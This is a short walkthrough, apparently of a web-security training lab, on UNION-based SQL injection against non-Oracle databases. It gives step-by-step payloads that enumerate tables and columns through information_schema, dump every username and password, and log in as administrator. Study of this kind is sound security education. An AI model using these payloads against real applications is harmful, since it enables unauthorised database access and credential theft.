## SQL injection attack, listing the database contents on non-Oracle databases

In my previous, the step still same, just looking for some user name/password or user_.....

- In burpsuite, choose filter category. Example `Gifts`
- Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
  `' UNION SELECT 'abc', 'def'--`
- Use the following payload to retrieve the list of tables in the database:
  `' UNION SELECT table_name, NULL FROM information_schema.tables--`
- Find the name of the table containing user credentials.
- Use the following payload (replacing the table name: `users_abcdef`) to retrieve the details of the columns in the table:
  `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
- Find the names of the columns containing usernames and passwords.
- Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
  `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
- Find the password for the administrator user, and use it to log in.
